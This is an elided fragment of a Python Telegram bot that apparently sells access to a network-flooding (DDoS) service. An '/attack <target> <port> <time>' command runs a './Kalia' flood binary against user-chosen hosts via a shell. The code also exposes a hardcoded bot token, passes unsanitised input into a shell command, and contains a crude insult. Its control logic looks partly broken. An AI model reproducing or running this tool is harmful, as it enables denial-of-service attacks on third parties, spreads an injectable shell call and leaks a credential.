...
bot = telebot.TeleBot('7980957881:AAEdrfb2bvULB_s00cMwhnp5yrIZzO9nvMc')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "ONLY OWNER @TRUSTVIP_MOD0 CAN USE."
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 121:
                ...
                full_command = f"./Kalia {target} {port} {time} 800"
                subprocess.run(full_command, shell=True)
                response = f"Flooding Complete"
        else:
            response = "Usage :- /attack <target> <port> <time>"  # Updated command syntax
    else:
        response = " PHLE CHUDBA LE APNI GAMD TRUST SE 🤣 ACCES LEKR AA @TRUSTVIP_MOD0 "
